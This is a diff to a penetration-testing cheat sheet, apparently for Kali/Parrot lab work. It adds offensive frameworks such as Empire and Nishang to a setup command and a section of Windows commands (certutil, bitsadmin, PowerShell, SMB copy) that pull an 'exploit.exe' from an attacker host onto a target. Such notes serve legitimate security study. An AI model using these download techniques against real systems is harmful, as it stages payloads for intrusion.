@@ -19,7 +19,7 @@ Commands for easy first-time setup of a Kali/Parrot VM after setting up a new im
  ### Install/update useful packages and tools
  
  ```
- sudo apt update -y && sudo apt install -y gobuster crowbar metasploit-framework python3-pip python3-venv seclists curl enum4linux ffuf gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf`
+ sudo apt update -y && sudo apt install -y gobuster crowbar metasploit-framework mingw-w64 powershell-empire nishang starkiller python3-pip python3-venv seclists curl enum4linux ffuf gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf`
  sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
  ```
  
@@ -170,6 +170,27 @@ john --rules=MyRule --wordlist=wordlist.txt hashes.txt
 
 
 ## Windows Misc
+### Windows Files Transfers
+HTTP
+```
+certutil.exe -urlcache -f http://10.10.10.10/exploit.exe bad.exe
+
+bitsadmin /transfer update /download /priority normal http://10.10.10.10/exploit.exe C:\Windows\Temp\exploit.exe
+
+powershell -c 'Invoke-WebRequest http://10.10.10.10/exploit.exe -outfile C:\Windows\Temp\exploit.exe'
+
+powershell -c '(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/exploit.exe ", "C:\Windows\Temp\exploit.exe")'
+
+```
+SMB
+```
+// If you don't have an SMB set up, use impacket
+impacket-smbserver export /tmp
+
+// cmd.exe
+net use \\10.10.10.10\export 
+copy \\10.10.10.10\export\exploit.exe C:\Windows\Temp\exploit.exe
+```
 
 ### Search through registry for "pass" in value name
 ```
